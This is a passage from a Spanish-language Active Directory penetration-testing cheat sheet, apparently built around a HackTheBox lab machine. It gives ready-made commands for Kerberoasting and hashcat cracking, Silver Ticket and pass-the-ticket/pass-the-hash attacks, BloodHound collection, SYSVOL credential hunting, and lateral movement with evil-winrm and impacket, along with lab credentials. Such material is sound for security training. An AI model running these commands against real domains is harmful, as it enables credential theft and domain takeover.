<li>Kerberoasting (cuentas con SPN)</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">impacket-GetUserSPNs</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINIO.LOCA</span><span style="color:#F8F8F2">L</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">use</span><span style="color:#F8F8F2">r</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">:</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">pas</span><span style="color:#F8F8F2">s</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -dc-ip</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -request</span><span style="color:#BD93F9"> -outputfile</span><span style="color:#F1FA8C"> tgs_hashes.txt</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Hashcat: modo 13100 (TGS etype23) o 19600/19800 (AES)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">hashcat</span><span style="color:#BD93F9"> -m</span><span style="color:#BD93F9"> 13100</span><span style="color:#F1FA8C"> tgs_hashes.txt</span><span style="color:#F1FA8C"> rockyou.txt</span></span>
<span class="line"></span></code></pre>
<ul>
<li>Kerberos Attacks</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># Silver Ticket</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">kerberos::golden</span><span style="color:#F1FA8C"> /domain:dom.local</span><span style="color:#F1FA8C"> /sid:S-1-5-21-...</span><span style="color:#F1FA8C"> /rc4:</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">NTLM_SERVIC</span><span style="color:#F8F8F2">E</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> /service:CIFS</span><span style="color:#F1FA8C"> /target:SERVER</span><span style="color:#F1FA8C"> /user:ADMIN</span><span style="color:#F1FA8C"> /ptt</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Pass-the-Ticket</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">export</span><span style="color:#BD93F9"> KRB5CCNAME</span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2">/</span><span style="color:#BD93F9">path</span><span style="color:#F8F8F2">/</span><span style="color:#BD93F9">to</span><span style="color:#F8F8F2">/</span><span style="color:#BD93F9">ticket</span><span style="color:#F8F8F2">.</span><span style="color:#BD93F9">ccache</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">psexec.py</span><span style="color:#BD93F9"> -k</span><span style="color:#BD93F9"> -no-pass</span><span style="color:#F1FA8C"> dominio.local/administrador@DC01</span></span>
<span class="line"></span></code></pre>
<h3 id="hashcat">Hashcat</h3>









































<table><thead><tr><th>Ataque</th><th>Hashcat Mode</th><th>Hash Source</th><th>Comando</th></tr></thead><tbody><tr><td>AS-REP Roasting (RC4)</td><td><code>18200</code></td><td><code>GetNPUsers.py</code></td><td><code>hashcat -m 18200 asrep_hashes.txt rockyou.txt</code></td></tr><tr><td>Kerberoasting (RC4)</td><td><code>13100</code></td><td><code>GetUserSPNs.py</code></td><td><code>hashcat -m 13100 tgs_hashes.txt rockyou.txt</code></td></tr><tr><td>Kerberoasting (AES128)</td><td><code>19600</code></td><td>Avanzado</td><td><code>hashcat -m 19600 tgs_aes128.txt rockyou.txt</code></td></tr><tr><td>Kerberoasting (AES256)</td><td><code>19800</code></td><td>Avanzado</td><td><code>hashcat -m 19800 tgs_aes256.txt rockyou.txt</code></td></tr><tr><td>NetNTLMv2 (SMB)</td><td><code>5600</code></td><td>SMB Relay, responder, etc.</td><td>‚úÖ Pero <strong>no se usa para Kerberos</strong></td></tr></tbody></table>
<p><strong>Notas/Evidencia:</strong></p>
<ul>
<li>Usuarios v√°lidos: ‚Ä¶</li>
<li>AS-REP hashes: ‚Ä¶</li>
<li>SPNs encontrados: ‚Ä¶</li>
</ul>
<hr>
<h2 id="enum4linux-ng">enum4linux-ng</h2>
<h4 id="1Ô∏è‚É£-escaneo-b√°sico"><strong>1Ô∏è‚É£ Escaneo b√°sico</strong></h4>
<p><code>enum4linux-ng 10.10.11.69</code></p>
<ul>
<li>Informaci√≥n general: OS, shares, usuarios visibles.</li>
</ul>
<hr>
<h4 id="2Ô∏è‚É£-enumerar-usuarios"><strong>2Ô∏è‚É£ Enumerar usuarios</strong></h4>
<p><code>enum4linux-ng -U 10.10.11.69</code></p>
<ul>
<li>Lista los usuarios del dominio.</li>
</ul>
<hr>
<h4 id="3Ô∏è‚É£-enumerar-grupos"><strong>3Ô∏è‚É£ Enumerar grupos</strong></h4>
<p><code>enum4linux-ng -G 10.10.11.69</code></p>
<ul>
<li>Lista los grupos del dominio.</li>
</ul>
<hr>
<h4 id="4Ô∏è‚É£-enumerar-shares-y-permisos"><strong>4Ô∏è‚É£ Enumerar shares y permisos</strong></h4>
<p><code>enum4linux-ng -S 10.10.11.69</code></p>
<ul>
<li>Muestra los shares y sus permisos de acceso.</li>
</ul>
<hr>
<h4 id="5Ô∏è‚É£-enumerar-pol√≠ticas-y-configuraciones"><strong>5Ô∏è‚É£ Enumerar pol√≠ticas y configuraciones</strong></h4>
<p><code>enum4linux-ng -P 10.10.11.69</code></p>
<ul>
<li>Extrae pol√≠ticas de contrase√±a y configuraciones de dominio.</li>
</ul>
<hr>
<h4 id="6Ô∏è‚É£-escaneo-agresivo-todas-las-comprobaciones"><strong>6Ô∏è‚É£ Escaneo agresivo (todas las comprobaciones)</strong></h4>
<p><code>enum4linux-ng -A 10.10.11.69</code></p>
<ul>
<li>Ejecuta todos los m√≥dulos posibles.</li>
</ul>
<hr>
<h4 id="7Ô∏è‚É£-usando-credenciales"><strong>7Ô∏è‚É£ Usando credenciales</strong></h4>
<ul>
<li>Lista los usuarios del dominio.</li>
</ul>
<p><code>enum4linux-ng -u j.fleischman -p 'J0elTHEM4n1990!' 10.10.11.69</code></p>
<ul>
<li>Enumerar todo y guardar en un archivo</li>
</ul>
<p><code>enum4linux-ng -A -u USUARIO -p 'PASS' -v &#x3C;IP> -oA enumeracion</code></p>
<hr>
<h1 id="3-explotaci√≥n">3 Explotaci√≥n</h1>
<h2 id="bloodhound">BloodHound</h2>
<ul>
<li>Pasos para usar Bloodhound en kali:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># Descargar el relese correspondiente desde https://github.com/SpecterOps/BloodHound-Legacy/releases?utm_source=chatgpt.com</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Descomprimir, entrar en la carpeta, darle permisos de ejecucion si no los tiene</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">./BloodHound</span><span style="color:#BD93F9"> --no-sandbox</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Se abrira la ventana web y pedira usuario = ne4j y password que sera la que nosotros pusimos en neo4j cuando nos pidio cambiar la contrase√±a</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Buscar en blodhound Shortest Paths to Unconstrained Delegation Systems</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Usar con usuario root si da problemas</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> bloodhound-python</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> j.fleischman</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">J0elTHEM4n1990!</span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> fluffy.htb</span><span style="color:#BD93F9"> -dc</span><span style="color:#F1FA8C"> dc01.fluffy.htb</span><span style="color:#BD93F9"> -c</span><span style="color:#F1FA8C"> All</span><span style="color:#BD93F9"> --zip</span><span style="color:#BD93F9"> -ns</span><span style="color:#BD93F9"> 10.10.11.69</span><span style="color:#BD93F9"> --dns-tcp</span><span style="color:#BD93F9"> --disable-autogc</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">python3</span><span style="color:#F1FA8C"> bloodhound.py</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> p.agila</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">prometheusx-303</span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -ns</span><span style="color:#BD93F9"> 10.10.11.69</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> fluffy.htb</span><span style="color:#BD93F9"> -c</span><span style="color:#F1FA8C"> all</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">nxc</span><span style="color:#F1FA8C"> ldap</span><span style="color:#F1FA8C"> dc01.fluffy.htb</span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">j.fleischman</span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">¬°J0elTHEM4n1990!</span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> --bloodhound</span><span style="color:#BD93F9"> --collection</span><span style="color:#F1FA8C"> all</span><span style="color:#BD93F9"> --dns-tcp</span><span style="color:#BD93F9"> --dns-server</span><span style="color:#BD93F9"> 10.10.11.69</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">nxc</span><span style="color:#F1FA8C"> ldap</span><span style="color:#F1FA8C"> dc01.fluffy.htb</span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">j.fleischman</span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">¬°J0elTHEM4n1990!</span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> --bloodhound</span><span style="color:#BD93F9"> --collection</span><span style="color:#F1FA8C"> All</span><span style="color:#BD93F9"> --dns-tcp</span><span style="color:#BD93F9"> --dns-server</span><span style="color:#BD93F9"> 10.10.11.69</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">nxc</span><span style="color:#F1FA8C"> smb</span><span style="color:#BD93F9"> 10.10.11.69</span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">j.fleischman</span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">¬°J0elTHEM4n1990!</span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> --bloodhound</span><span style="color:#BD93F9"> --collection</span><span style="color:#F1FA8C"> All</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">SharpHound.exe</span><span style="color:#BD93F9"> --CollectionMethod</span><span style="color:#F1FA8C"> All</span><span style="color:#BD93F9"> --ZipFileName</span><span style="color:#F1FA8C"> loot.zip</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">bloodhound-python</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> fluffy.htb</span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">j.fleischman</span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">¬°J0elTHEM4n1990!</span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -dc</span><span style="color:#F1FA8C"> dc01.fluffy.htb</span><span style="color:#BD93F9"> -c</span><span style="color:#F1FA8C"> All</span><span style="color:#BD93F9"> --zip</span></span>
<span class="line"></span></code></pre>
<ul>
<li>
<p>Importar en GUI y buscar rutas:</p>
<ul>
<li>
<p><em>Shortest Paths to Domain Admins</em></p>
</li>
<li>
<p>Objetos con <code>GenericAll/GenericWrite</code>, <code>AddMember</code>, <code>Owns</code></p>
</li>
<li>
<p>Grupos privilegiados: <code>Domain Admins</code>, <code>Account Operators</code>, <code>Backup Operators</code></p>
</li>
</ul>
</li>
</ul>
<p><strong>Notas/Evidencia:</strong></p>
<ul>
<li>Relaciones cr√≠ticas: ‚Ä¶</li>
<li>Ruta a DA: ‚Ä¶</li>
</ul>
<hr>
<h2 id="-usando-sharphound-en-la-m√°quina-v√≠ctimawindows">üîπ Usando <strong>SharpHound (en la m√°quina v√≠ctima/Windows)</strong></h2>
<ol>
<li>
<p>Subes el binario (<code>SharpHound.exe</code>):</p>
<p>‚Äú</p>
</li>
<li>
<p>Esto genera un <code>.zip</code> que puedes importar directamente en BloodHound.</p>
<p>Opciones interesantes:</p>
<ul>
<li>
<p><code>--CollectionMethod All</code> ‚Üí todo</p>
</li>
<li>
<p><code>--CollectionMethod ACL,Group,Session</code> ‚Üí personalizado</p>
</li>
<li>
<p><code>--Stealth</code> ‚Üí recolecci√≥n m√≠nima y m√°s sigilosa</p>
</li>
</ul>
</li>
</ol>
<hr>
<h2 id="-usando-bloodhound-python-alternativa-linux-sin-sharphound">üîπ Usando <strong>BloodHound-python</strong> (alternativa Linux sin SharpHound)</h2>
<p>Recolectar desde Windows:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"></span>
<span class="line"><span style="color:#8BE9FD">Import-Module</span><span style="color:#F8F8F2"> .\SharpHound.ps1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">Invoke-BloodHound</span><span style="color:#FF79C6"> -</span><span style="color:#F8F8F2">CollectionMethod All </span><span style="color:#FF79C6">-</span><span style="color:#F8F8F2">ZipFileName loot.zip</span></span>
<span class="line"></span></code></pre>
<p>Desde Kali:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">bloodhound-python</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> usuario</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> contrase√±a</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -dc-ip</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> --collection</span><span style="color:#F1FA8C"> ALL</span></span>
<span class="line"></span></code></pre>
<p>Recolecci√≥n desde Linux</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">bloodhound-python</span><span style="color:#BD93F9"> -u</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">use</span><span style="color:#F8F8F2">r</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">&#x3C;pass></span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -d</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINIO.LOCA</span><span style="color:#F8F8F2">L</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -ns</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DC_I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -c</span><span style="color:#F1FA8C"> All</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> bh</span></span>
<span class="line"></span></code></pre>
<ul>
<li>
<p>Importar en GUI y buscar rutas:</p>
<ul>
<li>
<p><em>Shortest Paths to Domain Admins</em></p>
</li>
<li>
<p>Objetos con <code>GenericAll/GenericWrite</code>, <code>AddMember</code>, <code>Owns</code></p>
</li>
<li>
<p>Grupos privilegiados: <code>Domain Admins</code>, <code>Account Operators</code>, <code>Backup Operators</code></p>
</li>
</ul>
</li>
</ul>
<p><strong>Notas/Evidencia:</strong></p>
<ul>
<li>Relaciones cr√≠ticas: ‚Ä¶</li>
<li>Ruta a DA: ‚Ä¶</li>
</ul>
<h2 id="impacket-exploits">Impacket Exploits</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># Pass-the-Hash</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">impacket-psexec</span><span style="color:#F1FA8C"> dominio/usuario@10.10.11.69</span><span style="color:#BD93F9"> -hashes</span><span style="color:#F1FA8C"> LM:NT</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># WMIExec</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">impacket-wmiexec</span><span style="color:#F1FA8C"> dominio/usuario:pass@10.10.11.69</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># SMBExec</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">impacket-smbexec</span><span style="color:#F1FA8C"> dominio/usuario:pass@10.10.11.69</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"></span></code></pre>
<ul>
<li>B√∫squeda de credenciales en SYSVOL/NETLOGON</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#F1FA8C"> //</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">&#x3C;DC_HOST></span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">/SYSVOL</span><span style="color:#BD93F9"> -N</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Buscar</span></span>
<span class="line"><span style="color:#50FA7B">recurse</span><span style="color:#F1FA8C"> ON</span></span>
<span class="line"><span style="color:#50FA7B">ls</span></span>
<span class="line"><span style="color:#6272A4"># Descarga Policies/...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Local: gpp-decrypt &#x3C;cpassword></span></span>
<span class="line"></span></code></pre>
<ul>
<li>Otros secretos (scripts, .xml, .ini, .bat)</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">find</span><span style="color:#F1FA8C"> .</span><span style="color:#BD93F9"> -type</span><span style="color:#F1FA8C"> f</span><span style="color:#BD93F9"> -iregex</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">.*\.(xml|ini|bat|ps1|vbs|txt)</span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> -print</span></span>
<span class="line"></span></code></pre>
<p><strong>Notas/Evidencia:</strong></p>
<ul>
<li>cpassword: ‚Ä¶</li>
<li>credenciales encontradas: ‚Ä¶</li>
</ul>
<hr>
<h2 id="-movimiento-lateral-y-ejecuci√≥n-remota">üíª Movimiento lateral y ejecuci√≥n remota</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">evil-winrm</span><span style="color:#BD93F9"> -i</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">HOS</span><span style="color:#F8F8F2">T</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">use</span><span style="color:#F8F8F2">r</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">&#x3C;pass></span><span style="color:#E9F284">'</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">evil-winrm</span><span style="color:#BD93F9"> -i</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">HOS</span><span style="color:#F8F8F2">T</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">use</span><span style="color:#F8F8F2">r</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -H</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">NTLM_HAS</span><span style="color:#F8F8F2">H</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">impacket-wmiexec</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINIO.LOCA</span><span style="color:#F8F8F2">L</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">use</span><span style="color:#F8F8F2">r</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">:</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">&#x3C;pass></span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">@</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">HOS</span><span style="color:#F8F8F2">T</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">impacket-psexec</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINIO.LOCA</span><span style="color:#F8F8F2">L</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">use</span><span style="color:#F8F8F2">r</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">:</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">&#x3C;pass></span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">@</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">HOS</span><span style="color:#F8F8F2">T</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">crackmapexec</span><span style="color:#F1FA8C"> smb</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">use</span><span style="color:#F8F8F2">r</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">&#x3C;pass></span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> --shares</span><span style="color:#BD93F9"> --sessions</span><span style="color:#BD93F9"> --disks</span><span style="color:#BD93F9"> --loggedon-users</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">psexec.py</span><span style="color:#F1FA8C"> dominio.local/usuario:pass@</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbexec.py</span><span style="color:#F1FA8C"> dominio.local/usuario:pass@</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">wmiexec.py</span><span style="color:#F1FA8C"> dominio.local/usuario@</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -hashes</span><span style="color:#F1FA8C"> :</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">NTL</span><span style="color:#F8F8F2">M</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">evil-winrm</span><span style="color:#BD93F9"> -i</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> usuario</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> contrase√±a</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"></span></code></pre>
<p><strong>Notas/Evidencia:</strong></p>
<ul>
<li>Hosts accesibles: ‚Ä¶</li>
<li>Comandos ejecutados: ‚Ä¶</li>
</ul>
<hr> </div> <div class="mt-16 pt-8 border-t border-slate-800"> <a href="/projects" class="text-slate-400 hover:text-accentBlue transition-colors">
‚Üê Volver a la lista de proyectos
</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
¬© 2026 Angel Corral - Todos los derechos reservados.
</div> </footer> </div> </body></html>